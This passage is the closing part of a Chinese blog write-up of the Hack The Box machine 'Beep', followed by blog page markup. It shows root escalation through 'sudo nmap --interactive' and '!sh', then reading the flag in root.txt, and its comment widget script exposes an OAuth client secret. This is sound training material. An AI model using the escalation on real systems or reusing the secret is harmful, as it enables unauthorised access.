+# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+</code></pre>
+<p>按照exploit里提示的进行提权试试</p>
+<pre><code class="bash">bash-3.2$ sudo nmap --interactive
+sudo nmap --interactive
+
+Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt; !sh
+!sh
+sh-3.2# whoami&amp;&amp;id
+whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+</code></pre>
+<p>成功拿到root权限</p>
+<pre><code class="bash">sh-3.2# cd /root
+cd /root
+sh-3.2# ls
+ls
+anaconda-ks.cfg            install.log.syslog  webmin-1.570-1.noarch.rpm
+elastix-pr-2.2-1.i386.rpm  postnochroot
+install.log                root.txt
+sh-3.2# cat root.txt
+cat root.txt
+493be6af70ce6780ee96432618649fe4
+</code></pre>
+<p>成功拿到root权限的flag文件</p>
+<p>咱们看一下原理</p>
+<pre><code class="bash">sh-3.2# sudo -l
+sudo -l
+Matching Defaults entries for root on this host:
+    env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY&quot;
+
+User root may run the following commands on this host:
+    (ALL) ALL
+</code></pre>
+<p>这里可以执行的权限还挺多的</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/&title=《Beep - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/&title=《Beep - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Beep - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/03/10/Hackthebox/Hackthebox-Optimum/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Optimum - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/03/03/Hackthebox/Hackthebox-Devel/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Devel - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/&title=《Beep - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/&title=《Beep - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Beep - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACOklEQVR42u3awY6DMAxF0f7/TzObWVTqwNxnh0o4l1VVIZrD4tWx83rh63i73r/5vOfz/s87r595dv+CS4YMGY9lHJfX9bLIIq5J6e+eUmXIkLEB4yzByHL5Ukg0X8f66fcyZMiQ0Vg0iU4ZMmTIWMtIy0qy9+RbZRkyZOzMSIMvbZZ1AnfxXlyGDBkPZNRi8Tufb5lvyJAh41GMVSFY27721/P7HBkyZIxm8IDjJRqPVFJu8sMfMmTImMrgjTYSkfyARXrU7B+YDBkyRjNq7fhO+548oRjZMmTIGM3gjX4SjjxweXDz+2XIkDGP0V907QkchkJfhgwZGzDIVpP/WCdki0MFGTJkbMPgByzSMOUD0fR1/BG4MmTIGMcgm890YFkbEtSiWYYMGbsxeKEW9PAao4X4dciQIWMog7Ty+yF7xygUnQ2RIUPGCEbtoAMfOvLXxAcPQYUrQ4aMEYx+a54vOt0GB5teGTJkjGbwgq8/JOBb4luqXRkyZIxj1OKPB2v6+kgpKUOGjNmMwLq0MceXi0JchgwZ2zA6xy/4dpQsl/wZBDfJkCFjBKPWSiOb1Vqbr7h9lSFDxjjGEV61gE6PlBWLQhkyZAxlpJPB4ARHOCKtjRmKA04ZMmQ8kHF3yPLYrUW2DBky9mGQR6ctMDIWTUu90/acDBkyZOBCME3C9BhZcFpEhgwZMsIxZDCMDFtyMmTI2IdBNrH8EMaqkpHDZMiQMZvBt458DEDKQV4ydo5oyJAh4+GMH9KsYL7tvUJBAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
